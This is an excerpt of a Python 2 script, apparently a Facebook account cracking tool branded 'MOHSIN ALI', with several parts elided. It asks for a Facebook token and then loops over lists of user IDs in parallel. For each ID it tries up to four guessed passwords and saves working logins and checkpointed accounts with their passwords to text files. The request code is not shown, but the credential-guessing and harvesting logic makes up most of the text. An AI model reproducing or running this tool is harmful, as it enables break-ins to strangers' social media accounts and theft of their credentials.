...
def reg():
    ...
    if to in r:
        ...
        print ' \033[1;92mCOPY THE ID AND SEND TO MOHSIN'
...
def reg2():
    ...
    print ' \033[1;92mCopy AND SEND TO ME ON FB to continue'
    ...
    sav.write(id)
    sav.close()
    raw_input('\033[1;92m Press enter to check Approval By Mohsin ')
    reg()
...
def log_menu():
	...
	print 47 * '-'
        ...
        print '\033[1;92m[3] Follow MOHSIN ALI On FB'
        print ''
        log_menu_s()
...
def log_menu_s():
    s = raw_input(' \033[1;97m╰─MOHSIN ALI➤ ')
    if s == '1':
        log_fb()
    elif s == '2':
        log_token()
...
def log_token():
    ...
    print 47 * '-'
    tok = raw_input(' \033[1;92mPaste token here By Mohsin: \033[1;91m')
    print 47 * '-'
...
def menu():
    ...
    print '\033[1;92m[2] Follow MOHSIN ALI'
...
def menu_s():
    ms = raw_input('\033[1;97m╰─MOHSIN ALI➤ ')
    if ms == '1':
        auto_crack()
    elif ms == '2':
        os.system('xdg-open https://www.facebook.com/MohsinAliOfficail')
    elif ms == '3':
        v_tok()
    elif ms == '4':
        lout()
...
def a_s():
    ...
    cps = []
    oks = []
    a_s = raw_input(' \033[1;97m╰─MOHSIN ALI➤ ')
    if a_s == '1':
        os.system('clear')
        print logo
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\033[1;92mMOHSIN ALI THE BRAND\033[1;94m'
    print 47 * '-'
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\033[1;95m[MOHSIN-OK]➤ ' + uid + ' | ' + pass1
                ok = open('/sdcard/ids/MOHSIN_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\033[1;97m[MOHSIN-CP]➤ ' + uid + ' | ' + pass1
                cp = open('MOHSIN_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\033[1;95m[MOHSIN-OK]➤ ' + uid + ' | ' + pass2
                    ok = open('/sdcard/ids/MOHSIN_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\033[1;97m[MOHSIN-CP]➤ ' + uid + ' | ' + pass2
                    cp = open('MOHSIN_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\033[1;95m[MOHSIN-OK]➤ ' + uid + ' | ' + pass3
                        ok = open('/sdcard/ids/MOHSIN_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\033[1;97m[MOHSIN-CP]➤ ' + uid + ' | ' + pass3
                        cp = open('MOHSIN_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\033[1;95m[MOHSIN-OK]➤ ' + uid + ' | ' + pass4
                            ok = open('/sdcard/ids/MOHSIN_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\033[1;97m[MOHSIN-CP]➤ ' + uid + ' | ' + pass4
                            cp = open('MOHSIN_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
    ...
    p.map(main, id)
    print 47 * '-'
    print ' \033[1;92mGod is really creative, I mean... just look at me MOHSIN'
